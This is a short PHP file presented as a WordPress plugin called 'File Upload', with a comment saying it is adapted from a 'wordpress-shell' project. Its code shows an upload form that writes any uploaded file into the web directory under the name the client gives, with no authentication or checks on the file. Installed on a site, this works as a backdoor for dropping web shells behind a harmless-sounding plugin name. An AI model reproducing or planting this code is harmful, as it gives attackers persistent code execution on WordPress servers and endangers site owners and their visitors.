<?php
    /*
    Plugin Name: File Upload
    Plugin URI: https://github.com/Xi4u7
    Description: Simple File Upload
    Version: 1.0
    Author URI: https://github.com/Xi4u7
    */

// Copied and modified from https://github.com/leonjza/wordpress-shell

echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>File Uploaded!!<b><br><br>'; }
else { echo '<b>Fail To Upload File!!!</b><br><br>'; }
}
?>
